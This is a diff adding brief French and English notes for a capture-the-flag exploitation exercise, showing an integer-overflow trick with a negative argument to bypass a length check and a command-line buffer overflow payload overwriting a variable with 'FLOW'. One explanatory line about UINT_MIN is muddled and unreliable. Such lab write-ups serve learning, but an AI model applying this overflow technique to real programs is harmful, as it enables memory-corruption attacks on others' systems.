@@ -1,0 +1,13 @@
+1. gdb bonus1 / disass main
+2. on voit qu'il y a un memcpy, il est possible de bufferoverflow/underflow cette function. Dans le cas present il faut l'underflow c'est a dire envoyer une longueur negative a memcpy
+3. On toruve la bonne valuer negative pour que l'on puisse passe le atoi 
+{
+	so the UINT_MIN is -4294967296 which is equal to -1 we have to find a negative value when it
+	is multiplied by 4 will give a number larger than 20, which will trigger as segmentation fault in
+	memcpy().
+	This number is -1073741810 X 4 = 56
+}
+4. {
+	En jouant avec le padding on voit apparaitre la value FLOW a l'addresse  $esp+0x3c 0xbffff6cc:	 "AAAFLOW"
+}
+./bonus1 -1073741810 `python -c 'print "A"*40+"\x46\x4c\x4f\x57"'`
